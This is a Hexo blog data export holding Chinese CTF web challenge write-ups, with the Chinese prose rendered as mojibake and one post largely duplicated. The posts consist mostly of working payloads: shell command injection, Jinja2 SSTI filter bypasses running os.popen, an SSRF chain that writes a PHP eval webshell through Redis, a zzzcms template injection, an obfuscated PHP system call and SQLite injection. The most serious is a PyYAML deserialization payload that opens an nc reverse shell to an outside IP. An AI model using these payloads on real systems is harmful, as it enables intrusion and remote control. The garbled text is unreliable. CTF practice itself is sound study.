{"meta":{"title":"buxqm","subtitle":null,"description":null,"author":"Ycj","url":"http://yoursite.com","root":"/"},"pages":[{"title":"categories","date":"2019-09-10T12:46:13.000Z","updated":"2020-09-28T08:34:27.483Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"","slug":"xyb/xyb","date":"2020-11-22T12:46:07.660Z","updated":"2020-11-22T12:49:22.912Z","comments":true,"path":"2020/11/22/xyb/xyb/","link":"","permalink":"http://yoursite.com/2020/11/22/xyb/xyb/","excerpt":"","text":"Web1 Commandä¸€é“pingçš„å‘½ä»¤æ‰§è¡Œ|æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œä½¿ç”¨||æ‹¼æ¥å‘½ä»¤ï¼Œä½¿ç”¨%09ä»£æ›¿ç©ºæ ¼ï¼Œè¿‡æ»¤äº†è®¸å¤šè¯»æ–‡ä»¶çš„å‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨/bin/ca?ç»•è¿‡ï¼Œè¿‡æ»¤äº†*ï¼Œå°è¯•ä½¿ç”¨find /éå†ç›®å½•ã€‚ 1111||find%09/ å‘ç°flag 2333ï¼Œè¿‡æ»¤äº†*ï¼Œä½¿ç”¨?ä»£æ›¿ã€‚ 1111||/bin/ca?%09/etc/.find????/????.txt flag{59e8c8d2-b274-4e77-82cc-c1c41d699685} Web2 flaskbotéšä¾¿æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°æ‰“å¼€äº†debugï¼Œå‘ç°ç¨‹åºè¯»å–ç›´æ¥è¯»å–cookieä¸­çš„nameï¼Œç„¶åbase64è§£å¯†æ‰“å°å‡ºæ¥ï¼Œä½†æ˜¯åœ¨/è·¯ç”±ä¸‹å¥½åƒè¢«å­—ç¬¦ä¸²åŒ–äº†ï¼Œä¸èƒ½ç›´æ¥sstiã€‚ ä½†æ˜¯ä»–è·å–æ•°å­—ä½¿ç”¨äº†floatæ–¹æ³•num = float(request.form[&#39;num&#39;])ã€‚ Pythonçš„floatèƒ½ä½¿ç”¨inf,-inf,nanæ¥åˆ›é€ ä¸€äº›ç‰¹æ®Šæµ®ç‚¹æ•°ï¼Œå‘ç°æˆ‘ä»¬è¾“å…¥nanæ—¶èµ¢äº†ï¼Œå¹¶ä¸”æ‰“å‡ºäº†æˆ‘ä»¬çš„åå­—ï¼Œè¿™é‡Œå°±æ˜¯sstiç‚¹ï¼Œä½¿ç”¨æ–‡ä»¶è¯»å–ï¼Œå‘ç°æ ¹ç›®å½•æ— flagï¼Œåªèƒ½é€šè¿‡å‘½ä»¤æ‰§è¡Œæ¥è·å–ã€‚ 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&apos;/fl&apos;+&apos;ag&apos;).read()&#125;&#125; è¯»ä¸€ä¸‹æºç ï¼Œå¾—åˆ°é»‘åå•ï¼Œå¼€å§‹ç»•è¿‡ã€‚ 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&apos;/app/app.py&apos;).read()&#125;&#125; 1[&apos;flag&apos;,&apos;os&apos;,&apos;system&apos;,&apos;popen&apos;,&apos;import&apos;,&apos;eval&apos;,&apos;chr&apos;,&apos;request&apos;, &apos;subprocess&apos;,&apos;commands&apos;,&apos;socket&apos;,&apos;hex&apos;,&apos;base64&apos;,&apos;*&apos;,&apos;?&apos;] ä½¿ç”¨ä¸€æŠŠæ¢­payloadå¾—åˆ°flagã€‚ 1234567&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &apos;ev&apos;+&apos;al&apos; in b.keys() %&#125; &#123;&#123; b[&apos;ev&apos;+&apos;al&apos;](&apos;__impor&apos;+&apos;t__(&quot;o&quot;+&quot;s&quot;).po&apos;+&apos;pen(&quot;cat /super_secret_fla&quot;+&quot;g&quot;+&quot;.txt&quot;).read()&apos;) &#125;&#125; &#123;% endif %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; flag{3f17f077-c4f3-4298-be69-40693ab86396} Web3 easygogogoç”¨goè¯­è¨€å†™çš„æ–‡ä»¶ä¸Šä¼ ï¼Œcookieä¸­æœ‰è´¦å·å¯†ç ã€æ–‡ä»¶åç­‰ä¸€äº›æ•°æ®ï¼Œä½†æ˜¯åŠ äº†ç›ï¼Œæ— æ³•ç ´è§£ã€‚ æŠ“åŒ…è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥ä»»æ„ç›®å½•ç©¿è¶Šï¼Œå®ç°ä»»æ„æ–‡ä»¶è¦†ç›–ï¼Œç»è¿‡å¤šæ¬¡æµ‹è¯•å‘ç°ï¼Œå³ä½¿é‡å¯é¶æœºï¼Œåªè¦æ–‡ä»¶ç›®å½•ä¸å˜ï¼Œcookieæ˜¯ä¸ä¼šæ”¹å˜çš„ï¼Œæ‰€ä»¥å¯ä»¥ç¬¬ä¸€æ¬¡è¦†ç›–/flagï¼Œå¾—åˆ°è¯¥æ–‡ä»¶çš„cookieå€¼ï¼Œç„¶åé‡å¯é¶æœºï¼Œå®ç°æ–‡ä»¶è¯»å–ã€‚ 1cookie=Q/+BAwEBBVVzZXJzAf+CAAEEAQhVc2VybmFtZQEMAAEIUGFzc3dvcmQBDAABCEZpbGVuYW1lAQwAAQRTaWduAQwAAAB4/4IBAzEyMwEDMTIzAUcuL3VwbG9hZHMvNGU1YjA5YjIxNDlmNzYxOWNjYTE1NWM4YmQ2ZDhlZTUvLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZmxhZwEgMWFjMzEzNWU1NTM0YzM0MDZiOWVlYjhlODRiMDdjMDIA ä½†æ˜¯ç›´æ¥è¯»å–ä¼šå‡ºç°å›¾ç‰‡ä¸å­˜åœ¨çš„é—®é¢˜ï¼Œæµ‹è¯•äº†è®¸å¤šæ¬¡ï¼Œå‘ç°éœ€è¦é¦–å…ˆä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œç„¶åå†ä¿®æ”¹cookieå€¼ï¼Œæ‰èƒ½å¾—åˆ°ç»è¿‡base64åŠ å¯†çš„flagã€‚ è§£å¯†å¾—åˆ°flag flag{b311219d-a8d8-41d8-a953-171fffe9b128} Web4 doyouknowssrfè¿™æ˜¯ä¸€é“åŸé¢˜https://mp.weixin.qq.com/s/0cOsuIFJwHbHIYvluQq4WQ è¿™é‡Œä½¿ç”¨parse_urlæ¥æ£€æµ‹ç«¯å£ï¼Œéƒ½çŸ¥é“ï¼Œparse_urlå’Œcurlè§£ææ–¹å¼ä¸ä¸€æ ·æ¯”å¦‚ä¸‹é¢çš„urlï¼Œparse_urlå°†baidu.comè§£æä¸ºä¸»æœºï¼Œp@127.0.0.1:6379è§£æä¸ºå¯†ç ï¼Œä½†æ˜¯curlä¼šå°†127.0.0.1:6379è§£æä¸ºip:portï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„payloadæ¥æ¢æµ‹å†…ç½‘ã€‚ 1url=http://u:p@127.0.0.1:6379@baidu.com æ‰«äº†ä¸€ä¸‹å¸¸ç”¨ç«¯å£ï¼Œå‘ç°5000ç«¯å£ï¼Œæ˜¯ä¸€ä¸ªflaskæœåŠ¡ï¼Œè¿˜æ˜¯ä¸€ä¸ªssrfï¼Œå¥½å®¶ä¼™ssrfå¥—ssrfï¼ï¼Œè¿˜æœ‰ä¸€ä¸ª6379ç«¯å£ï¼Œé‚£è‚¯å®šæ˜¯ç”¨å†…ç½‘çš„falskæœåŠ¡æ¥æ‰“redisã€‚ 1?url=http://u:p@127.0.0.1:5000@baidu.com%3furl=https://baidu.com è¯•äº†ä¸€ä¸‹ï¼Œgopherå’Œdictåè®®æ²¡ç‚¹ååº”ï¼Œåæ¥ä»æ–‡ç« ä¸­äº†è§£åˆ°urllibåº“æœ‰ä¸€ä¸ªcsrfæ¼æ´ï¼Œé‚£gopherèƒ½ä¸èƒ½ç”¨å°±ä¸é‡è¦äº†ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªcsrfæ¼æ´é‡æ–°æ„é€ ä¸€ä¸ªhttpè¯·æ±‚åŒ…ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½å°†payloadä¼ é€’ç»™redisï¼Œè¿™é‡Œç”±äºåœ¨å†…ç½‘ï¼Œæ‰€ä»¥éœ€è¦ç¼–ç ä¸¤æ¬¡ã€‚ 1url=http://u:p@127.0.0.1:5000@baidu.com%3furl=http%3a%2f%2f127.0.0.1%3a6379%2f%2520HTTP%2f1.1%250D%250Aset%2520m%25201223%250D%250ATEST%253A%2520123 æˆåŠŸæ”¶åˆ°äº†ä¸€ä¸ªæŠ¥é”™ï¼ŒssrfæˆåŠŸã€‚ ä½†æ˜¯ï¼Œè¿™ä¸ªssrfè¿˜å¸¦å¯†ç ï¼Œåªèƒ½é€šè¿‡çˆ†ç ´æ¥å¾—åˆ°å¯†ç äº†ï¼Œç”±äºæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥åªèƒ½ä½¿ç”¨slaveofå‘½ä»¤å°†å‘½ä»¤æ‰§è¡Œç»“æœå¸¦å…¥æˆ‘ä»¬çš„vpsä¸­ï¼Œå¦‚æœå¯†ç æ­£ç¡®ï¼Œåˆ™ä¼šæœ‰ä¸€ä¸ªpingæŒ‡ä»¤å‘é€è¿‡æ¥ã€‚éšä¾¿è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å¯†ç æ˜¯123456ï¼ï¼Œç›´æ¥ç”¨Rediså†™Webshellã€‚ 1url=http://u:p@127.0.0.1:5000@baidu.com%3furl=http%3a%2f%2f127.0.0.1%3a6379%2f%2520HTTP%2f1.1%250D%250A%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527aa%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A å¾—åˆ°flag flag{709df8e5-608a-47bc-bb9f-1256090ed06c} web5 easyzzzä¸€ä¸ªzzzcmsçš„æ¨¡æ¿æ³¨å…¥ï¼Œè€é¢˜ç›®äº†ï¼Œhttps://www.anquanke.com/post/id/212272#h2-10ã€‚ è¿™é“é¢˜æµ‹äº†åŠå¤©ï¼Œåœ¨/search postä¼ keysæœ‰ifä¼šè¢«ç›´æ¥banæ‰ï¼Œç»è¿‡æµ‹è¯•åå‘ç°getä¹Ÿèƒ½ä¼ ï¼Œè€Œä¸”ä¸ä¼šè¢«BANï¼ï¼é‚£å°±ç®€å•äº†ï¼Œè¿™é¢˜è¿˜åŠ äº†ç‚¹wafï¼Œå‡ºç°systemç­‰å‡½æ•°ä¼šç›´æ¥500ï¼Œå‡ºç°chrç­‰å‡½æ•°ä¼šè¢«ç›´æ¥æ‹¦æˆªï¼Œä½†æ˜¯å¯ä»¥ç”¨array_mapå’Œbase_convertç»•è¿‡ï¼Œç”¨äº¦æˆ–æ„é€ ä¸€ä¸ª/ï¼Œ 123/=(base_convert(25,10,36)^base_convert(1,10,36)^base_convert(23,10,36))readfile=base_convert(2146934604002,10,36)flag=base_convert(727432,%2010, 36) ç„¶åæ‰§è¡Œreadfile(/flag)å³å¯å¾—åˆ°flagã€‚ 1?location=search&amp;keys=&#123;if:array_map(base_convert(2146934604002,10,36),array((base_convert(25,10,36)^base_convert(1,10,36)^base_convert(23,10,36)).base_convert(727432,%2010,%2036)))&#125;&#123;end%20if&#125; flag{9fcf8f2e-32e2-4d7a-bdf9-6da82f17c0e8} web6 profile systemä¸Šä¼ yamlï¼Œåœ¨ä¸‹è½½çš„æ—¶å€™å‘ç°èƒ½å¤Ÿç›®å½•ç©¿è¶Šè¯»åˆ°æºç /uploads/4e5b09b2149f7619cca155c8bd6d8ee5/../../app.py è¯»äº†ä¸€ä¸‹æºç ï¼Œå¾—åˆ°secretkey:Th1s_is_A_Sup333er_s1cret_k1yyyyyï¼Œå‘ç°ä¼ªé€ priviledgeä¸ºeliteå¯ä»¥è§¦å‘yamlååºåˆ—åŒ–ï¼Œä½¿ç”¨å·¥å…·ä¼ªé€ sessionã€‚ è¿˜éœ€è¦ç»•è¿‡æ­£åˆ™ï¼Œä¸»è¦æ˜¯ä¸èƒ½æœ‰_å’Œ.ï¼Œuiuctf2020æœ‰ä¸€ä¸ªç±»ä¼¼çš„é¢˜ç›®https://hackmd.io/@harrier/uiuctf20ã€‚ä½¿ç”¨mapè°ƒç”¨evalï¼Œç”¨16è¿›åˆ¶ 12_=\\x5f.=\\x2e ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼ï¼Œç›´æ¥å¼¹shellï¼Œ/readflagè¯»å–flagã€‚ 1!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [&quot;\\x5f\\x5fimport\\x5f\\x5f(&apos;os&apos;)\\x2esystem(&apos;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 8\\x2e129\\x2e69\\x2e85 2333 &gt;/tmp/f&apos;)&quot;]]] flag{746ad7f8-14c2-465b-95bc-611328186899}","categories":[],"tags":[]},{"title":"ç¥¥äº‘æ¯","slug":"ç¥¥äº‘æ¯","date":"2020-11-20T16:00:00.000Z","updated":"2020-11-28T13:58:24.678Z","comments":true,"path":"2020/11/21/ç¥¥äº‘æ¯/","link":"","permalink":"http://yoursite.com/2020/11/21/ç¥¥äº‘æ¯/","excerpt":"","text":"Web1 Commandä¸€é“pingçš„å‘½ä»¤æ‰§è¡Œ|æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œä½¿ç”¨||æ‹¼æ¥å‘½ä»¤ï¼Œä½¿ç”¨%09ä»£æ›¿ç©ºæ ¼ï¼Œè¿‡æ»¤äº†è®¸å¤šè¯»æ–‡ä»¶çš„å‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨/bin/ca?ç»•è¿‡ï¼Œè¿‡æ»¤äº†*ï¼Œå°è¯•ä½¿ç”¨find /éå†ç›®å½•ã€‚ 1111||find%09/ å‘ç°flag 2333ï¼Œè¿‡æ»¤äº†*ï¼Œä½¿ç”¨?ä»£æ›¿ã€‚ 1111||/bin/ca?%09/etc/.find????/????.txt Web2 flaskbotéšä¾¿æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°æ‰“å¼€äº†debugï¼Œå‘ç°ç¨‹åºè¯»å–ç›´æ¥è¯»å–cookieä¸­çš„nameï¼Œç„¶åbase64è§£å¯†æ‰“å°å‡ºæ¥ï¼Œä½†æ˜¯åœ¨/è·¯ç”±ä¸‹å¥½åƒè¢«å­—ç¬¦ä¸²åŒ–äº†ï¼Œä¸èƒ½ç›´æ¥sstiã€‚ ä½†æ˜¯ä»–è·å–æ•°å­—ä½¿ç”¨äº†floatæ–¹æ³•num = float(request.form[&#39;num&#39;])ã€‚ Pythonçš„floatèƒ½ä½¿ç”¨inf,-inf,nanæ¥åˆ›é€ ä¸€äº›ç‰¹æ®Šæµ®ç‚¹æ•°ï¼Œå‘ç°æˆ‘ä»¬è¾“å…¥nanæ—¶èµ¢äº†ï¼Œå¹¶ä¸”æ‰“å‡ºäº†æˆ‘ä»¬çš„åå­—ï¼Œè¿™é‡Œå°±æ˜¯sstiç‚¹ï¼Œä½¿ç”¨æ–‡ä»¶è¯»å–ï¼Œå‘ç°æ ¹ç›®å½•æ— flagï¼Œåªèƒ½é€šè¿‡å‘½ä»¤æ‰§è¡Œæ¥è·å–ã€‚ 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&apos;/fl&apos;+&apos;ag&apos;).read()&#125;&#125; è¯»ä¸€ä¸‹æºç ï¼Œå¾—åˆ°é»‘åå•ï¼Œå¼€å§‹ç»•è¿‡ã€‚ 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&apos;/app/app.py&apos;).read()&#125;&#125; 1[&apos;flag&apos;,&apos;os&apos;,&apos;system&apos;,&apos;popen&apos;,&apos;import&apos;,&apos;eval&apos;,&apos;chr&apos;,&apos;request&apos;, &apos;subprocess&apos;,&apos;commands&apos;,&apos;socket&apos;,&apos;hex&apos;,&apos;base64&apos;,&apos;*&apos;,&apos;?&apos;] ä½¿ç”¨ä¸€æŠŠæ¢­payloadå¾—åˆ°flagã€‚ 1234567&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &apos;ev&apos;+&apos;al&apos; in b.keys() %&#125; &#123;&#123; b[&apos;ev&apos;+&apos;al&apos;](&apos;__impor&apos;+&apos;t__(&quot;o&quot;+&quot;s&quot;).po&apos;+&apos;pen(&quot;cat /super_secret_fla&quot;+&quot;g&quot;+&quot;.txt&quot;).read()&apos;) &#125;&#125; &#123;% endif %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; Web3 easygogogoç”¨goè¯­è¨€å†™çš„æ–‡ä»¶ä¸Šä¼ ï¼Œcookieä¸­æœ‰è´¦å·å¯†ç ã€æ–‡ä»¶åç­‰ä¸€äº›æ•°æ®ï¼Œä½†æ˜¯åŠ äº†ç›ï¼Œæ— æ³•ç ´è§£ã€‚ æŠ“åŒ…è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥ä»»æ„ç›®å½•ç©¿è¶Šï¼Œå®ç°ä»»æ„æ–‡ä»¶è¦†ç›–ï¼Œç»è¿‡å¤šæ¬¡æµ‹è¯•å‘ç°ï¼Œå³ä½¿é‡å¯é¶æœºï¼Œåªè¦æ–‡ä»¶ç›®å½•ä¸å˜ï¼Œcookieæ˜¯ä¸ä¼šæ”¹å˜çš„ï¼Œæ‰€ä»¥å¯ä»¥ç¬¬ä¸€æ¬¡è¦†ç›–/flagï¼Œå¾—åˆ°è¯¥æ–‡ä»¶çš„cookieå€¼ï¼Œç„¶åé‡å¯é¶æœºï¼Œå®ç°æ–‡ä»¶è¯»å–ã€‚ 1cookie=Q/+BAwEBBVVzZXJzAf+CAAEEAQhVc2VybmFtZQEMAAEIUGFzc3dvcmQBDAABCEZpbGVuYW1lAQwAAQRTaWduAQwAAAB4/4IBAzEyMwEDMTIzAUcuL3VwbG9hZHMvNGU1YjA5YjIxNDlmNzYxOWNjYTE1NWM4YmQ2ZDhlZTUvLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZmxhZwEgMWFjMzEzNWU1NTM0YzM0MDZiOWVlYjhlODRiMDdjMDIA ä½†æ˜¯ç›´æ¥è¯»å–ä¼šå‡ºç°å›¾ç‰‡ä¸å­˜åœ¨çš„é—®é¢˜ï¼Œæµ‹è¯•äº†è®¸å¤šæ¬¡ï¼Œå‘ç°éœ€è¦é¦–å…ˆä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œç„¶åå†ä¿®æ”¹cookieå€¼ï¼Œæ‰èƒ½å¾—åˆ°ç»è¿‡base64åŠ å¯†çš„flagã€‚ è§£å¯†å¾—åˆ°flag Web4 doyouknowssrfè¿™æ˜¯ä¸€é“åŸé¢˜https://mp.weixin.qq.com/s/0cOsuIFJwHbHIYvluQq4WQ è¿™é‡Œä½¿ç”¨parse_urlæ¥æ£€æµ‹ç«¯å£ï¼Œéƒ½çŸ¥é“ï¼Œparse_urlå’Œcurlè§£ææ–¹å¼ä¸ä¸€æ ·æ¯”å¦‚ä¸‹é¢çš„urlï¼Œparse_urlå°†baidu.comè§£æä¸ºä¸»æœºï¼Œp@127.0.0.1:6379è§£æä¸ºå¯†ç ï¼Œä½†æ˜¯curlä¼šå°†127.0.0.1:6379è§£æä¸ºip:portï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„payloadæ¥æ¢æµ‹å†…ç½‘ã€‚ 1url=http://u:p@127.0.0.1:6379@baidu.com æ‰«äº†ä¸€ä¸‹å¸¸ç”¨ç«¯å£ï¼Œå‘ç°5000ç«¯å£ï¼Œæ˜¯ä¸€ä¸ªflaskæœåŠ¡ï¼Œè¿˜æ˜¯ä¸€ä¸ªssrfï¼Œå¥½å®¶ä¼™ssrfå¥—ssrfï¼ï¼Œè¿˜æœ‰ä¸€ä¸ª6379ç«¯å£ï¼Œé‚£è‚¯å®šæ˜¯ç”¨å†…ç½‘çš„falskæœåŠ¡æ¥æ‰“redisã€‚ 1?url=http://u:p@127.0.0.1:5000@baidu.com%3furl=https://baidu.com è¯•äº†ä¸€ä¸‹ï¼Œgopherå’Œdictåè®®æ²¡ç‚¹ååº”ï¼Œåæ¥ä»æ–‡ç« ä¸­äº†è§£åˆ°urllibåº“æœ‰ä¸€ä¸ªcsrfæ¼æ´ï¼Œé‚£gopherèƒ½ä¸èƒ½ç”¨å°±ä¸é‡è¦äº†ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªcsrfæ¼æ´é‡æ–°æ„é€ ä¸€ä¸ªhttpè¯·æ±‚åŒ…ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½å°†payloadä¼ é€’ç»™redisï¼Œè¿™é‡Œç”±äºåœ¨å†…ç½‘ï¼Œæ‰€ä»¥éœ€è¦ç¼–ç ä¸¤æ¬¡ã€‚ 1url=http://u:p@127.0.0.1:5000@baidu.com%3furl=http%3a%2f%2f127.0.0.1%3a6379%2f%2520HTTP%2f1.1%250D%250Aset%2520m%25201223%250D%250ATEST%253A%2520123 æˆåŠŸæ”¶åˆ°äº†ä¸€ä¸ªæŠ¥é”™ï¼ŒssrfæˆåŠŸã€‚ ä½†æ˜¯ï¼Œè¿™ä¸ªssrfè¿˜å¸¦å¯†ç ï¼Œåªèƒ½é€šè¿‡çˆ†ç ´æ¥å¾—åˆ°å¯†ç äº†ï¼Œç”±äºæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥åªèƒ½ä½¿ç”¨slaveofå‘½ä»¤å°†å‘½ä»¤æ‰§è¡Œç»“æœå¸¦å…¥æˆ‘ä»¬çš„vpsä¸­ï¼Œå¦‚æœå¯†ç æ­£ç¡®ï¼Œåˆ™ä¼šæœ‰ä¸€ä¸ªpingæŒ‡ä»¤å‘é€è¿‡æ¥ã€‚éšä¾¿è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å¯†ç æ˜¯123456ï¼ï¼Œç›´æ¥ç”¨Rediså†™Webshellã€‚ 1url=http://u:p@127.0.0.1:5000@baidu.com%3furl=http%3a%2f%2f127.0.0.1%3a6379%2f%2520HTTP%2f1.1%250D%250A%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527aa%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A å¾—åˆ°flag web5 easyzzzä¸€ä¸ªzzzcmsçš„æ¨¡æ¿æ³¨å…¥ï¼Œè€é¢˜ç›®äº†ï¼Œhttps://www.anquanke.com/post/id/212272#h2-10ã€‚ è¿™é“é¢˜æµ‹äº†åŠå¤©ï¼Œåœ¨/search postä¼ keysæœ‰ifä¼šè¢«ç›´æ¥banæ‰ï¼Œç»è¿‡æµ‹è¯•åå‘ç°getä¹Ÿèƒ½ä¼ ï¼Œè€Œä¸”ä¸ä¼šè¢«BANï¼ï¼é‚£å°±ç®€å•äº†ï¼Œè¿™é¢˜è¿˜åŠ äº†ç‚¹wafï¼Œå‡ºç°systemç­‰å‡½æ•°ä¼šç›´æ¥500ï¼Œå‡ºç°chrç­‰å‡½æ•°ä¼šè¢«ç›´æ¥æ‹¦æˆªï¼Œä½†æ˜¯å¯ä»¥ç”¨array_mapå’Œbase_convertç»•è¿‡ï¼Œç”¨äº¦æˆ–æ„é€ ä¸€ä¸ª/ï¼Œ 123/=(base_convert(25,10,36)^base_convert(1,10,36)^base_convert(23,10,36))readfile=base_convert(2146934604002,10,36)flag=base_convert(727432,%2010, 36) ç„¶åæ‰§è¡Œreadfile(/flag)å³å¯å¾—åˆ°flagã€‚ 1?location=search&amp;keys=&#123;if:array_map(base_convert(2146934604002,10,36),array((base_convert(25,10,36)^base_convert(1,10,36)^base_convert(23,10,36)).base_convert(727432,%2010,%2036)))&#125;&#123;end%20if&#125; flag{9fcf8f2e-32e2-4d7a-bdf9-6da82f17c0e8} web6 profile systemä¸Šä¼ yamlï¼Œåœ¨ä¸‹è½½çš„æ—¶å€™å‘ç°èƒ½å¤Ÿç›®å½•ç©¿è¶Šè¯»åˆ°æºç /uploads/4e5b09b2149f7619cca155c8bd6d8ee5/../../app.py è¯»äº†ä¸€ä¸‹æºç ï¼Œå¾—åˆ°secretkey:Th1s_is_A_Sup333er_s1cret_k1yyyyyï¼Œå‘ç°ä¼ªé€ priviledgeä¸ºeliteå¯ä»¥è§¦å‘yamlååºåˆ—åŒ–ï¼Œä½¿ç”¨å·¥å…·ä¼ªé€ sessionã€‚ è¿˜éœ€è¦ç»•è¿‡æ­£åˆ™ï¼Œä¸»è¦æ˜¯ä¸èƒ½æœ‰_å’Œ.ï¼Œuiuctf2020æœ‰ä¸€ä¸ªç±»ä¼¼çš„é¢˜ç›®https://hackmd.io/@harrier/uiuctf20ï¼Œä½¿ç”¨mapè°ƒç”¨evalï¼Œç”¨16è¿›åˆ¶ 1_=\\x5f .=\\x2e ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼ï¼Œç›´æ¥å¼¹shellï¼Œ/readflagè¯»å–flagã€‚ 1!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [&quot;\\x5f\\x5fimport\\x5f\\x5f(&apos;os&apos;)\\x2esystem(&apos;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 8\\x2e129\\x2e69\\x2e85 2333 &gt;/tmp/f&apos;)&quot;]]]","categories":[{"name":"ç¥¥äº‘æ¯","slug":"ç¥¥äº‘æ¯","permalink":"http://yoursite.com/categories/ç¥¥äº‘æ¯/"}],"tags":[]},{"title":"æŠ¤ç½‘æ¯","slug":"æŠ¤ç½‘æ¯","date":"2020-10-25T16:00:00.000Z","updated":"2020-10-26T11:04:06.509Z","comments":true,"path":"2020/10/26/æŠ¤ç½‘æ¯/","link":"","permalink":"http://yoursite.com/2020/10/26/æŠ¤ç½‘æ¯/","excerpt":"","text":"SimpleCalculatorä¸€é“è®¡ç®—é¢˜ï¼Œè¿‡æ»¤äº†è®¸å¤šå‡½æ•°ï¼Œè¿™ä¸2018å¹´å›½èµ›é‚£é¢˜å¾ˆåƒï¼Œä¸è¿‡è¿‡æ»¤äº†base_convertï¼Œå¯ä»¥ä½¿ç”¨å–åç»•è¿‡ã€‚ 12$pi=(~%8C%86%8C%8B%9A%92);$cos=(~%9C%9E%8B%DF%D0%99%93%9E%98);$pi($cos);$pi=systemï¼Œ$cos=cat /flag SQLManagerè¿™é¢˜æ˜¯ä¸€é“SQLLiteæ³¨å…¥ï¼Œå‘ç°å¯ä»¥åˆ›å»ºè¡¨åï¼Œå‘ç°å’ŒZer0pts2020å¾ˆåƒï¼Œæˆ‘ä»¬å¯ä»¥æƒ³åˆ°ä½¿ç”¨asæ¥å¤åˆ¶è¡¨ï¼Œè¿™é‡Œè¦è¯´ä¸€ä¸‹sqlliteä¸­çš„ç³»ç»Ÿè¡¨sqlite_masterï¼Œè¯¥è¡¨å­˜å‚¨ç€å½“å‰æ•°æ®åº“çš„æ‰€æœ‰è¡¨çš„ç›¸å…³ä¿¡æ¯ï¼Œæ¯”å¦‚è¡¨çš„åç§°ï¼Œåˆ›å»ºè¡¨çš„sqlè¯­å¥ç­‰ç­‰ã€‚ ç»“æœæµ‹è¯•å‘ç°ï¼Œè¯¥é¢˜è¡¨åä¸èƒ½å«æœ‰å•å¼•å·ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸­æ‹¬å·æ¥åŒ…è£¹è¡¨åï¼Œè®©ä»–å¤åˆ¶sqllite_masteræ¥å»ºè¡¨ï¼Œä»è€Œå¾—åˆ°sqllite_masterä¸­çš„ä¿¡æ¯ã€‚ 1payload:[aaa] as select [sql][example] from sqlite_master; å¾—åˆ°äº†flagçš„è¡¨åå’Œåˆ—åï¼Œç›´æ¥è¯»å–flag 1[aaa] as select [flag_ThE_C0lumn][example] from flag_Y0U_c4ng_GUESS; 